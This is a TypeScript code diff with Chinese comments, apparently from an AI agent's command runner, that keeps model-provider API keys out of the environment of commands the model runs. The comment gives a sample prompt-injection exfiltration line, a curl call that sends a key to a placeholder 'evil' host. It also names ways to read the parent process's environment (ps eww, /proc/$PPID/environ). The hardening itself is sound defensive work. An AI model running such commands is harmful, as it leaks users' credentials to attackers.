@@ -79,9 +79,13 @@ const NON_INTERACTIVE_ENV = {
 } as const;
 
 /**
- * 命令看不到的环境变量（2026-11-15）：echo 自己的 key——各家模型（`BUILTIN_PROVIDER_KEY_ENV`）与 web_search。
+ * 不传给命令的环境变量（2026-11-15）：echo 自己的 key——各家模型（`BUILTIN_PROVIDER_KEY_ENV`）与 web_search。
  * 命令是模型给的，模型可能被注入的内容骗着跑 `curl https://evil/?k=$DEEPSEEK_API_KEY`；这些 key 命令本来也用不着。
  * 用户自己的 token（`GITHUB_TOKEN`、`NPM_TOKEN` 这类）照旧传：`gh`、`npm` 要用，剥了会悄悄失去认证。
+ *
+ * **只挡随手引用，不是边界**（2026-11-16 实测）：命令与 agent 是同一个用户，父进程（agent 自己）的环境照样读得到——
+ * macOS `ps eww -p $PPID`、Linux `/proc/$PPID/environ`。key 真要护住，得靠 agent 进程外面：容器的出口限制、短期 key、
+ * 替请求加 key 的外部代理（决策记录 2026-11-15-security-hardening 的「已知代价与限制」）。
  */
 const SECRET_ENV: ReadonlySet<string> = new Set([...BUILTIN_PROVIDER_KEY_ENV, BRAVE_ENV]);
 
